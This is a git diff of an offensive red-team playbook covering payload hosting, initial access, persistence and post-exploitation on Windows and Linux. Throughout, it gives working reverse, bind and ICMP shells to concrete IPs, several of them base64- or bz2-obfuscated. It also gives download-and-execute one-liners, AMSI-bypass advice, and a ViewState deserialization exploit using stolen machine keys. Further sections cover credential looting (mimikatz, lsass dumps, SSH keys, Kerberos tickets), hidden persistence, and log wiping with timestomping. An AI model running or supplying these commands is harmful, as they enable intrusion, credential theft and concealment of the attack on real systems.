@@ -1,8 +1,9 @@
-###### 1.) Setup the local attacking machine, spin up a local socks proxy for initial proxychains entry. Forward traffic from redirector back to attacking machine for payload delivery. Spin up services that host the payloads.
+###### 1.) Setup the local attacking machine, spin up a local socks proxy for initial proxychains entry. Forward traffic from redirector back to attacking machine for payload delivery. Spin up services that host the payloads (modules directory).
 ```txt
+	# NOTE: icmp and udp can't be proxied via proxychains!.
 	# setting up, socks, port forwarding for payload delivery
 	ssh -f -N -D <LOCALIP>:<LOCALPORT> root@<REMOTEIP> # from local box
-	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector (port 445, 80, 443)
+	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector to Kali/etc (port 445, 80, 443)
 
 	# serving via http
 	python -m SimpleHTTPServer <LPORT>
@@ -17,58 +18,90 @@
 	smbserver.py -ip <LOCALIP> -port <LPORT> -smb2support <SHARENAME> ./
 	wsgidav --auth=anonymous --host=<LOCALIP> --port=<LPORT> --root=./
 	nc -lvp <LOCALPORT> < payload_to_send.py
+	nc -lvp <LOCALPORT> > payload_to_get.py
 ```
-###### 2.) Prepare for command execution, retrieve remote payloads served by the attacking machine or from compromised machines.	
+###### 2.) Prepare for command execution, oneliners, redirection, retrieve remote payloads served by the attacking machine or from compromised machines. See the c2 folder for examples and other payloads (icmp, http, dns, etc...). Less connections and processes are better, try to use minimal code execution to bootstrap extra features (see Stage2.ps1). 
 ```txt
-	# socks proxy on 0.0.0.0:65535
+	# NOTE: anything powershell, unhook/patch amsi first!, use this as a template: https://amsi.fail, if powershell is blacklisted/not avail, try PowerShdll.dll/exe.  base64 encoded increases size but obfuscates payloads (it can be decoded too).
+	# powershell socks proxy on 0.0.0.0:65535 
 	powershell -exec bypass iex('sal no new-object;sal o out-null;[scriptblock]$a={param($b);$c={param($b);$b.instream.copyto($b.outstream);exit};sal no new-object;sal o out-null;$g=$b.rsp;function gip{param($i);if($i -as [ipaddress]){return $i}else{$l=[system.net.dns]::gethostaddresses($i)[0].ipaddresstostring};return $l};$o=$b.cliconnection;$q=no system.byte[] 32;try{$r=$o.getstream();$r.read($q,0,2)|o;$v=$q[0];if($v -eq 5){$r.read($q,2,$q[1])|o;for($i=2; $i -le $q[1]+1; $i++){if($q[$i] -eq 0){break}};if($q[$i] -ne 0){$q[1]=255;$r.write($q,0,2)}else{$q[1]=0;$r.write($q,0,2)};$r.read($q,0,4)|o;$M=$q[1];$O=$q[3];if($M -ne 1){$q[1]=7;$r.write($q,0,2);throw "nt"};if($O -eq 1){$V=no system.byte[] 4;$r.read($V,0,4)|o;$Y=no system.net.ipaddress(,$V);$1=$Y.tostring()}elseif($O -eq 3){$r.read($q,4,1)|o;$6=no system.byte[] $q[4];$r.read($6,0,$q[4])|o;$1=[system.text.encoding]::ascii.getstring($6)};else{$q[1]=8;$r.write($q,0,2);throw "ns"};$r.read($q,4,2)|o;$ah=$q[4]*256+$q[5];$ak=gip($1);if($ak -eq $null){$q[1]=4;$r.write($q,0,2);throw "cs"};$aq=no system.net.sockets.tcpclient($ak,$ah);if($aq.connected){$q[1]=0;$q[3]=1;$q[4]=0;$q[5]=0;$r.write($q,0,10);$r.flush();$aB=$aq.getstream();$aD=$aB.copytoasync($r);$aG=$r.copytoasync($aB);$aG.asyncwaithandle.waitone();$aD.asyncwaithandle.waitone();};else{$q[1]=4;$r.write($q,0,2);throw "ct"}}elseif($v -eq 4){$M=$q[1];if($M -ne 1){$q[0]=0;$q[1]=91;$r.write($q,0,2);throw "nt"};$r.read($q,2,2)|o;$ah=$q[2]*256+$q[3];$V=no system.byte[] 4;$r.read($V,0,4)|o;$ak=no system.net.ipaddress(,$V);$q[0]=1;while($q[0] -ne 0){$r.read($q,0,1)};$aq=no system.net.sockets.tcpclient($ak,$ah);if($aq.connected){$q[0]=0;$q[1]=90;$q[2]=0;$q[3]=0;$r.write($q,0,8);$r.flush();$aB=$aq.getstream();$aD=$aB.copytoasync($r);$aG=$r.copyto($aB);$aG.asyncwaithandle.waitone();$aD.asyncwaithandle.waitone()}}else{throw "un"}}catch{}finally{if($o -ne $null){$o.dispose()};if($aq -ne $null){$aq.dispose()};exit}};function isp{param([string]$bz,[int]$bA,[int]$bB=200);try{$bC=no system.net.sockets.tcplistener([system.net.ipaddress]::parse($bz),$bA);$bC.start();$g=[runspacefactory]::createrunspacepool(1,$bB);$g.cleanupinterval=new-timespan -seconds 30;$g.open();while(1){$o=$bC.accepttcpclient();$b=[pscustomobject]@{"cliconnection"=$o;"rsp"=$g};$bP=[powershell]::create();$bP.runspacepool=$g;$bP.addscript($a).addargument($b)|o;$bP.begininvoke()|o;}}catch{throw $_}finally{if($bC -ne $null){$bC.stop()};if($o -ne $null){$o.dispose();$o=$null};if($bP -ne $null -and $b4 -ne $null){$bP.endinvoke($b4)|o;$bP.runspace.close();$bP.dispose()}}};isp -bz 0.0.0.0 -bA 65535')
 
-	# icmp shell to 10.49.117.253
+	# powershell icmp shell to 10.49.117.253 (requires icmpsh or similar)
 	powershell -exec bypass iex('$bs=128;sal n new-object;sal o out-null;function gb($v){([text.encoding]::ascii).getbytes($v);};$c=n system.net.networkinformation.ping;$po=n system.net.networkinformation.pingoptions;$po.dontfragment=1;function sd($b){$c.send("10.49.117.253",60*1000,$b,$po);};sd(gb("$((gl).path)>"))|o;while(1){$ry=sd(gb(" "));if($ry.buffer){$s=gb((iex(([text.encoding]::ascii).getstring($ry.buffer))2>&1|out-string));$i=0;if($s.length -gt $bs){while($i -lt ([math]::floor($s.length/$bs))){$s2=$s[($i*$bs)..(($i+1)*$bs-1)];sd($s2)|o;$i +=1;}if(($s.length % $bs) -ne 0){$s2=$s[($i*$bs)..($s.length)];sd($s2)|o;}}else{sd($s)|o;};sd(gb("`n$((gl).path)>"))|o;}else{sleep 5;}}')
 
-	# reverse shell to 192.168.26.128:65535
+	# powershell reverse shell to 192.168.26.128:65535
 	powershell -exec bypass iex('sal n new-object;$a=(n net.sockets.tcpclient("192.168.26.128",65535)).getstream();[byte[]]$b=0..65535|%{0};while(($c=$a.read($b,0,$b.length))-ne 0){$d=(n text.asciiencoding).getstring($b,0,$c);$i=([text.encoding]::ascii).getbytes((iex $d 2>&1|out-string));$a.write($i,0,$i.length)}')
 
-	# bind shell on 0.0.0.0:65535
+	# powershell bind shell on 0.0.0.0:65535
 	powershell -exec bypass iex('$a=[system.net.sockets.tcplistener]65535;$a.start();$c=$a.accepttcpclient();$e=$c.getstream();[byte[]]$g=0..65535|%{0};while(($h=$e.read($g,0,$g.length))-ne 0){$l=(new-object -typename system.text.asciiencoding).getstring($g,0,$h);$n=(iex $l 2>&1|out-string);$p="$($n)$((pwd).path)>";$q=([text.encoding]::ascii).getbytes($p);$e.write($q,0,$q.length);$e.flush()};$c.close();$a.stop();')
 
-	# udp reverse shell 
+	# powershell udp reverse shell 
 	powershell -exec bypass iex('sal n new-object;$a=n system.net.ipendpoint([system.net.ipaddress]::parse("192.168.26.128"),65535);$b=n system.net.sockets.udpclient(53);[byte[]]$u=0..65535|%{0};$c=([text.encoding]::ascii).getbytes(">");$b.send($c,$c.length,$a);while(1){$f=$b.receive([ref]$a);$i=([text.encoding]::ascii).getstring($f);$k=(iex $i 2>&1|out-string);$c=([text.encoding]::ascii).getbytes($k);$b.send($c,$c.length,$a)};$b.close();')
 
-	# socks proxy on 0.0.0.0:65535
+	# linux python3 socks proxy on 0.0.0.0:65535
 	python3 -c "import bz2,base64;exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWWewEq8AA9BfgGAScud/dz/r3wq/7//gUAVY3uxu7o7tYAAoMJJIJhT01PRoT0mm0jRoaaaGQNDQ0ZANAhGVNtKYjNQxNBp6gAaAGTQAJT1ElDQTNPUajMkZMAQxNHqME0bRDHNGTEwATEYEaYEGIwTJgEYJEgQIGgJoxJGR6j1AyAGh6gBki6ILoCINL3CCCIj2p0tTMqJyTBSSxRfMZUpPBJzpxWmw3P08rdCbN25dWb2Xd1GbHfAB7QAYQVYEVFUFQUVhREENUdWii6yaUW87DEkGBnMAxaZ3CDFSbjehJMwAeV/pBMq1Hrtfi6IqpkDYFWA3hOWpxalbQQxAmHsSVxuQDTWzYu9xDEYGdMRTmUuyv62M6YwoB7gwiy+iS+yIfyuhxtOwQhiojF7/kman6Q3kPighCjg6xP1fyuOa1YHMYaoJOxDzOW3ziFzSf6TQc+cPSBitZWFRXat1KkGASErzoVp0pQytftKl7xWNqkXMpu/Za0nOjrI3mmvo1Wxkq9nfE6BjCA1k4UqkholignKYoJpoM6wVAnZwZeohNXGWMwXTtwMUc1WckDgZ7zfx6h/UXSgrpeHR1wXocLoWB9gtVOJ/Hyd6DIZMu9juVGaBEN4SWPf5IFa5n660reWINSVEdFcmjUNjOI9gZMn9iXSG6GKrZfNor+Tt/vp7drKLg3uce8KM2pSaC4KSFJhcXzYDhKiphbCIoLwozMpKpyjcLCF6wd1mkeLL8CK5ppRZVbMcEhH15tDhmbI9JC2K3viy2PZn8HkmtZRSbdRmDHTyKEwzS/WgfMfogxL9w5EwlNDgI8D8nxijUDMbNGEDAdP8L5N+25/de8sDhTBEW1FOZqa9B+FPPn0soEGBI5ijByyvTofcXypYAwn/tDAoMAGMWNiDYUYmEokLzcakBqMDFFiYrK096AsIx8eWjxqR5ToUOYMItIqZulCcSZ6oLi4qHU2gYk9TGkEhK+RBNF9gEaSaCgSMWGBI7xXFRc0wPMpgFOsSiEpaCDAW3RwzKAUF7AYskg3CP6kxYbB7xEpVFqeRlmlyBodEbxgBzMVaH0sTGwV0233CxFMvVOJtj0mI+kJQZ6RS0OH0abNh8XU6snYGELwWYbMmjwCDQDQDDV/JcZgjWHHgSHfkTUjiKZ0mhBUTuDV47IN95YKq3iLmSKQdCqmBdQ78pKC9BpR3BgOAe0lMt3yPcNJEyyt0axZkUVEwhYgiCRZoU1IwwyqCGaQgKAYLl4D7kHYzOgjmLYdxsLmgXus2IOIWNJleua2vkKdhFg4HiguLztNjYzhDWL+VK/gLeGCOSqd1F5jSMmD0QLhWEMlBKZORCRxDscjWJcC2R14kol3m6agLBIkaEkxZaDwExcjWvaSQqDaaaNQj4SgicGLzTESY7LZEaZFTdJgLZBTRDVw780YMUbiIVENQG+Sk6i3CxCNTCa1bQIlfgXk7bAuTSTEMRKtFDC8XAp3469cJtFClQbJMZQkE0Q3EBImTmGAVQMrpO3rKiLGBUQZSu9RiInYDmloBf8IuNoZidlm+poEtBfixtBau4YmzUaRe3Mu+tm88+aeULsWkv8XckU4UJBnsBKvA')))"
 	
-	# general command execution
+	# linux python reverse shell to 192.168.26.128:65535
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.26.128",65535));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+	
+	# linux python3 (or 2.7) encoded reverse shell to 192.168.26.128:65535
+	python3 -c "import bz2,base64;exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWdOCex8AAEJfgAAQUGX7aisrnAC/b96gIACVCKZNA0NADQAaaAABlAp6maGiaAAABo3qm1GoO9bxcpvwxK57HFs0a9rC9Oc+aapgcSqUcdoyhaFhyPQnEYzCw1RvgDgjA1XghFqbxoTOVcpMU5nxD3AFC7iU3obkIadF5u91PIQiSoU0lZlAh9ggelhdIUuR9AxNWbypeFr3QwbWyIiwigUSMLx/F3JFOFCQ04J7Hw==')))"
+
+	# linux python reverse shell to fe80::20c:29ff:fe0e:c5bf:65535
+	python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("fe80::20c:29ff:fe0e:c5bf",65535,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+
+	# linux php reverse shell to 192.168.26.128:65535
+	php -r '$sock=fsockopen("192.168.26.128",65535);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+	# linux php encoded reverse shell to 192.168.26.128:65535
+	php -r "eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCIxOTIuMTY4LjI2LjEyOCIsNjU1MzUpO3NoZWxsX2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Cg=='));"
+
+	# linux bash echo reverse shell to 192.168.26.128:65535
+	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.26.128 65535 >/tmp/f"|bash -	
+	
+	# linux bash echo encoded reverse shell to 192.168.26.128:65535
+	echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4yNi4xMjggNjU1MzUgPi90bXAvZgo=|base64 -d|bash -
+	
+	# linux bash basic reverse shell to 192.168.26.128:65535
+	bash -i >& /dev/tcp/192.168.26.128/65535 0>&1;
+
+	# linux sh basic reverse shell to 192.168.26.128:65535
+	0<&196;exec 196<>/dev/tcp/192.168.26.128/65535; sh <&196 >&196 2>&196
+	
+	# linux sh basic reverse shell to 192.168.26.128:65535
+	sh -i >& /dev/udp/192.168.26.128/65535 0>&1
+
+	# windows general command execution via smb and http
 	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>
 	powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>
 	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
 	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
 	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)
 
-	# wmic xsl, local process, remote node process
+	# windows execution via http, wmic xsl, local process, remote node process (good for lateral)
 	wmic.exe process get brief /format:"https://<URL>/shell.xsl"
 	wmic.exe process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
 	wmic.exe /node:<TARGETIP> process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
 
-	# rundll32 jscript, smb, and webdav
+	# windows execution rundll32 jscript, smb, and webdav
 	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
 	rundll32 \\<SMBIP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
 	net use p: http://<WEBDAVIP> & rundll32 p:\PowerShdll.dll,main .{iwr -user https://<URL>/shell.ps1}^|iex;
 
-	# inf and sct via http
+	# windows execution inf and sct via http
 	cmstp.exe /ni /s https://<URL>/shell.inf
 	regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll
 
-	# schtask and at at 08AM
+	# windows execution via schtask and at at 08AM (good for lateral)
 	schtasks /create /s <TARGETIP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASKNAME>" /tr \\<SMBIIP>\<SHARENAME>\shell.exe /sc daily /st 08:00
 	at \\<TARGETIP> 08:00 /NEXT: \\<SMBIIP>\<SHARENAME>\shell.exe
 
-	# linux via http, python, bash
+	# linux execution via http, python, bash
 	wget -q -O - http://<IP>/shell.py|python -
 	curl -s http://<IP>/shell.py|sudo python -
 	curl -sv --insecure https://<IP>/shell.sh|bash -
 
-	# mssql xp_cmdshell sp, wmi mof 
+	# windows execution via mssql xp_cmdshell sp, wmi mof 
 	mofcomp.exe -N \\<TARGETIP>\root\subscription .\shell.mof
 	xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
 ```
@@ -134,17 +167,17 @@
 ```
 ###### 5.) Persistence, privesc, c2 on compromised Linux system.
 ```txt
-	# payload execution
+	# payload execution via http(s).
 	nohup curl --insecure -sv https://<IP>/<PAYLOAD>.py|python - & disown
 	nohup wget --no-check-certificate -q -O - https://<IP>/<PAYLOADSH>.sh|bash & disown
 	curl --insecure https://<IP>/<PAYLOAD> -o <PAYLOAD> && chmod +x <PAYLOAD> && ./<PAYLOAD>
 	
-	# local enumeration
+	# local enumeration using linenum, on disk and fileless via http.
 	curl --insecure https://<IP>/lse.sh -o /tmp/.le_lse.sh && chmod +x /tmp/.le_lse.sh && /tmp/.le_lse.sh -r report -e /tmp/ -t -r /tmp/.le_lse_<REPORTNAME>
 	curl --insecure https://<IP>/LinEnum.sh -o /tmp/.le.sh && chmod +x /tmp/.le.sh && /tmp/.le.sh -r report -e /tmp/ -t -r .le_<REPORTNAME>
 	proxychains scp pwn@<IP>:/tmp/*le_* . && proxychains ssh pwn@<IP> "rm /tmp/*le_*"
 	
-	# persistence, c2 via http, post exploitation
+	# persistence, c2 via http, post exploitation. c2 example, replace with favorite oneliner.
 	nohup curl --insecure -sv https://<IP>/http_basic_server.py|python - & disown
 	curl --insecure https://<IP>/redghost.sh -o /tmp/.rg.sh && chmod +x /tmp/.rg.sh && /tmp/.rg.sh 		
 	Payloads
@@ -160,7 +193,7 @@
 	MemoryExec
 	BanIP <BLUETEAMIP>
 	
-	# persistence, post exploitation, alternative
+	# persistence, post exploitation, alternative to redghost (fileless delivery needs modification or looks bad).
 	curl --insecure -sv https://<IP>/rg-nodialog.sh|bash -
 	#1 genpayload
 	#2 sudowrap 
@@ -175,45 +208,51 @@
 	#11 memoryexec
 	#12 banip		
 		
-	# proxying traffic, socks server ssh, socks python
+	# proxying traffic, socks server ssh, socks python example. can use php, py, or bash oneliners. 
 	nohup curl --insecure -sv https://<IP>/proxy_server.py|python - & disown
 	ssh -f -N -D <IP>:<LPORT> root@<RHOST>
 	
-	# proxying traffic, webshell php, webshell python fileless
+	# proxying traffic, webshell php, webshell python fileless example (see oneliners for options). http traffic is expected on dmz and .net hosts. .htaccess and web.config can be used for execution.
 	curl --insecure https://<IP>/tunnel.php -o /var/www/html/<PROXY>.php && chmod +x /var/www/html/<PROXY>.php	
 	nohup curl --insecure -sv https://<IP>/tunnel.py|python - & disown
 	
-	# proxying traffic, icmp to socks
+	# proxying traffic, icmp to socks. disabling icmp is pretty intrusive.
 	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
 	nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
 	
-	# local proxy tunnel for icmp, webshell
+	# local proxy tunnel for icmp, webshell (client side proxying for icmp and http).
 	attacking machine>python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>	
 	attacking machine>python regeorge-v2.py -l <LOCALIP> -p <LPORT> -u http://<IP>/tunnel.php
-	# edit proxychains.conf
+	
+	# edit proxychains.conf (ensure socks4 or socks5 matches the payload).
 	localnet 127.0.0.0/255.0.0.0
 	socks4 <IP> <PORT> <PASSWORD>
+	socks5 <IP> <PORT> <PASSWORD>
+	socks5 <IP> <PORT> <PASSWORD> <USERNAME> <PASSWORD>
 
-	# maintaining access, root user and SSH
-	# passwd root (out of scope)
+	# maintaining access, root user and SSH (make immutable to avoid deletion).
+	# passwd root (out of scope? or in scope for sassy blueteams..)
 	adduser <c2_NAME>
 	usermod -aG sudo <c2_NAME>
+	
+	# generating ssh key using rsa.
 	ssh-keygen -t rsa
 	
-	# hide commands via path preference
+	# hide commands via path preference (download and execute).
 	curl --insecure -sv https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
-	# hide from bash commands
+	# hide from bash commands, prepend path to bashrc (points to symlink, greps out c2 references).
 	# edit ~/.bashrc's:
 	# PATH=/bin/.usr/:${PATH}
 	. ./c2_bash_hide.sh && setupPwn
 
-	# lock files, keep password, encrypt 
+	# lock files, keep password, encrypt the chattr binary (prevents unlocking files unless they just upload a new copy...).
 	for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
 	  chattr +i ${f};
 	done;
+	# encrypt the local copy
 	openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;
 	
-	# loot credentials
+	# loot credentials on the host 
 	cat /home/*/.ssh/id*
 	cat /tmp/krb5cc_*
 	cat /tmp/krb5.keytab
@@ -221,18 +260,19 @@
 	cat /home/*/.mysql_history
 	cat /home/.bash_history
 
-	# clear timestamps and logs
+	# clear timestamps and logs (touch the timestamps recursively).
 	for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
 	  echo "" > ${f} 2>&1> /dev/null;
 	done;
 	for f in `find / -type f -name "*" 2>/dev/null`; do
 	  touch ${f} 2>&1> /dev/null;
 	done;
+	# clear the bash history
 	history -c && echo "" > ~/.bash_history
 ```
 ###### 6.) Attacking .NET server behind DMZ web-proxy.
 ```txt
-	# grab viewstate info
+	# grab viewstate info (testing purposes)
 	proxychains curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &
 
 	# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
@@ -257,11 +297,11 @@
 
 	ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
 
-	# lfi for web.config with machine keys, viewgen to generate payload
+	# using the lfi to obtain the web.config with machine keys, use viewgen to generate payload instead of ysoserial. replace command with favorite oneliner.
 	proxychains wget http://<FQDN>:<PORT>/Home/DownloadFile?file=`%2FWeb.config -O web.confg
 	viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
 	
-	# initial access via viewstate payload
+	# initial access via viewstate payload to trigger execution.
 	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
 	  -H 'Connection: keep-alive' \
 	  -H 'Content-Type: application/x-www-form-urlencoded' \
@@ -270,68 +310,98 @@
 	  -H 'Accept-Language: en-US,en;q=0.9' \
 	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1	  	
 	
-	# connect to compromised target via icmp, http, or just tcp...
+	# connect to compromised target via icmp. may be able to spoof icmp.  
 	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
 	python ./windows/windows_icmp_c2.py -shell <REMOTEIP> 
-	python ./windows/http_c2.py -ip <REMOTEIP> 
-	nc -lvp <LOCALPORT> 
+	
+	# connect to compromised target via tcp. requires redirect to port forward.
+	nc -lvp <LOCALPORTTCP> 
+	nc -luvp <LOCALPORTUDP> 
+	nc -6lvp <LOCALPORTIP6TCP> 
 ```
 ###### 7.) Persistence, privesc, c2 on compromised Windows system.
 ```txt
-	# payload execution
+	# payload execution, generic examples via http.
 	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
 	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
+	
+	# payload execution, generic examples via smb.
 	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>	
 	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)	
-	# load modules via icmp (if via http, etc..)
+	
+	# c2 using icmp example, requires icmpsh or similar to receive.
 	iex(iwr http(s)://<URL>/icmp_server.ps1); # use 'invoke-shell" to start ICMP C2, see fallback options..
 	
-	# local enumeration 
+	# c2 using http server, requires access to port (see socks proxy).
+	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell	
+	
+	# c2 using dns.
+	ruby ./dnscat2.rb -e open --no-cache --dns=port=<LPORT>,domain=<C2DOMAIN>
+	powercat -c <C2IP> -p <DNSPORT> -dns <C2DOMAIN> -ep 
+	
+	# local enumeration via http modules (plain connection)
 	iex(iwr http(s)://<URL>/Invoke-EDRChecker.ps1); invoke-edrchecker
 	iex(iwr http(s)://<URL>/HostEnum.ps1); invoke-hostenum -domain -htmlreport
 	iex(iwr http(s)://<URL>/SeatBelt.ps1); seatbelt
+	
+	# local enumeration via smb modules (plain connection)
 	\\<IP>\<SHARE>\SeatBelt.exe 
+	
+	# c2 local enumeration, including processes (for token impersonation, process spoofing, injection ... domain escalation).
 	Survey 
 	GetProcess
 	GetProcessFull	
 	
-	# persistence, c2 via icmp, http, post exploitation
+	# fall back execution via web shell
 	download_file /tmp/web.config c:/inetpub/wwwroot/css/web.config
 	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config		
-	iex(iwr http(s)://<URL>/icmp_server.ps1); invoke-shell
-	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell	
-	ruby ./dnscat2.rb -e open --no-cache --dns=port=<LPORT>,domain=<C2DOMAIN>
-	powercat -c <C2IP> -p <DNSPORT> -dns <C2DOMAIN> -ep 
 	
+	# persistence via wmi hook
 	InstallWMIPersistence <EventFilterName> <EventConsumerName>
-	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
+	
+	# persistence via registry, startup, and service (based on posh).
 	InstallPersistence 1
 	InstallPersistence 2
 	InstallPersistence 3
 	
-	# proxying traffic socks, http
+	# fall back for c2, rotates beacons (in case a single ip is blocked).
+	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
+		
+	# proxying traffic socks, invoke socks proxy via icmp c2
 	invoke_file /tmp/socks_proxy_server.ps1
+	
+	# invoke socks proxy via http, for use in a basic shell
 	iex(new-object net.webclient).downloadstring('<URL>/socks_proxy_server.ps1')	
+	
+	# download socks proxy shell (regeorge) via icmp and generic http download.
 	download_file /tmp/tunnel.aspx c:/inetpub/wwwroot/<FILENAME>.aspx
 	(new-object net.webclient).downloadstring('<URL>/tunnel.aspx')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\<FILENAME>.aspx
 
-	# maintaining access from icmp c2, migrate to explorer etc..
+	# maintaining access from icmp c2, migrate to explorer etc.. load module via icmp or http
 	invoke_file /tmp/InjectShellcode.ps1
 	iex(iwr http(s)://<URL>/InjectShellcode.ps1); 
+	
+	# generate shellcode for process injection/spoofing (see oneliners for other options). examples of http and smb.
 	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/<PAYLOAD>.ps1')\"" -f  powershell;
 	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(gc \\\\<IP>\\<SHARE>\\<PAYLOAD>.ps1\"" -f  powershell;
+	
+	# inject shellcode into netsh, spoof parent process using APC Queue (for domain escalation or evasion).
 	Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
+	
+	# token theft via icmp (example, see oneliners for other options). for domain escalation or evasion.
 	invoke_file /tmp/Invoke-TokenManipulation.ps1
 	invoke-tokenmanipulation -createprocess "cmd.exe" -username "<DOMAIN>/<USER>" processargs "/c powershell -exec bypass -noninteractive -e <BASE64>"";
 
-	# downgrade for DES hash, crack DES for NTLM
+	# downgrade for DES hash, crack DES for NTLM using internal monologue. see https://crack.sh/get-cracking/ for free cracking.
 	invoke_file /tmp/Get-Hash.ps1
 	Get-Hash
 	invoke-binary /tmp/InternalMonologue.exe
 
-	# kerberoast, loot TGT/TGS
+	# kerberoast, crack spns offline
 	invoke_file /tmp/Invoke-Kerberoast.ps1
 	invoke-kerberoast -domain target.local -outputformat hashcat|select hash
+	
+	# loot TGT/TGS via evil-winrm
 	invoke-binary rubeus.exe triage
 	invoke-binary rubeus.exe dump
 	
@@ -339,31 +409,39 @@
 	dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
 	invoke_file /tmp/Invoke-Mimikatz.ps1
 	Invoke-Mimikatz
-	invoke_binary Invoke-Mimikittenz.exe	
+	
+	# loot credentials without being admin
+	invoke_binary Invoke-Mimikittenz.exe
+	
+	# minidump and lsa dump via icmp c2 
 	invoke_file /tmp/Invoke-PowerDump.ps1
 	Invoke-PowerDump
 	
-	# lsa secrets via hives
+	# lsa secrets via hives, dump lsa and sam hashes offline
 	C:\> reg.exe save hklm\sam c:\temp\sam.save
 	C:\> reg.exe save hklm\security c:\temp\security.save
 	C:\> reg.exe save hklm\system c:\temp\system.save
 	python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 	
-	# looting lsass via minidumps, cover tracks
+	# looting lsass via minidumps, cover tracks (timestomp and secure delete).
 	invoke_file /tmp/Out-Minidump.ps1
 	Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
 	TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
 	download c:\temp\lsass_<PID>.dmp 
 	SecureDelete c:\temp\lsass_<PID>.dmp 
+	
+	# parse dumps offline using mimikatz
 	mimikatz # sekurlsa::minidump lsass.dmp
 	mimikatz # sekurlsa::logonPasswords full
 
-	# clear logs, disable and redirect rdp 
+	# clear logs, disable and redirect rdp to box of choice. 
 	foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}
 	DisableRDP
+	
+	# port forward rdp traffic to box.
